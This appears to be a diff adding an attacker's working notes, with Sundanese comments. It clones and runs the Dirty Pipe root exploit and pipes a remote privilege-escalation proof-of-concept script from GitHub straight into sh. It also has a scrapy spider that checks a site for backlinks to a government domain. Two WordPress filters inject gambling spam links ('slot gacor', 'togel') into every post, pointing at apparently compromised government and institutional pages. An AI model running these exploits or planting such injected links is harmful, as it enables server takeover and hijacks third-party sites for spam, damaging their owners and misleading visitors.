@@ -1,0 +1,71 @@
+sudo apt update && sudo apt upgrade polkit  # Debian/Ubuntu  
+sudo dnf update polkit                      # Fedora  
+sudo pacman -Syu polkit   
+
+
+dpkg -l | grep polkit  # Debian/Ubuntu  
+rpm -q polkit          # RHEL/Fedora  
+pacman -Q polkit       # Arch  
+
+
+
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploit.git
+cd CVE-2022-0847-DirtyPipe-Exploit
+gcc exploit.c -o exploit
+./exploit
+
+
+2023
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ThrynSec/CVE-2023-32629-CVE-2023-2640---POC-Escalation/refs/heads/main/poc.sh)"
+
+
+
+
+import scrapy
+
+class BacklinkSpider(scrapy.Spider):
+    name = "backlink_spider"
+    start_urls = ["https://lb.um-palembang.ac.id"]  # Situs anu bakal di-crawl
+
+    def parse(self, response):
+        for link in response.css("a::attr(href)").getall():
+            if "http" in link and "esakip.purwakartakab.go.id" in link:
+                yield {"backlink": link}
+
+
+
+Hayang nyimpen hasilna kana file? Pake paréntah ieu
+scrapy runspider backlink_scraper.py -o backlinks.json
+
+
+pip install scrapy
+scrapy startproject backlink_checker
+cd backlink_checker
+Simpen kode anu tadi di jero folder spiders/ dina file contona backlink_spider.py.
+cd backlink_checker/spiders
+nano backlink_spider.py
+cd ..
+scrapy crawl backlink_spider
+scrapy crawl backlink_spider -o hasil.json
+
+function tambah_backlink($content) {
+    if (is_single()) { // Nambihan backlink ukur di tulisan (post)
+        $backlink = '<p>slot gacor 2025: <a href="https://sertifikasi.lsp-migas.org/assets/files/sk/" target="_blank" rel="nofollow">slot gacor 2025</a></p>';
+        $content .= $backlink; // Nambahkeun backlink ka eusi tulisan
+    }
+    return $content;
+}
+add_filter('the_content', 'tambah_backlink');
+
+
+function tambah_backlink($content) {
+    if (is_single()) { // Nambihan backlink ukur di tulisan (post)
+        $backlink = '<p>slot gacor <a href="https://esakip.purwakartakab.go.id" target="_blank" rel="nofollow">slot gacor</a></p>';
+        $backlink .= '<p>togel terpercaya<a href="https://esakip.purwakartakab.go.id/skk/" target="_blank" rel="nofollow">togel terpercaya</a></p>';
+        $content .= $backlink;
+    }
+    return $content;
+}
+add_filter('the_content', 'tambah_backlink');
+
+
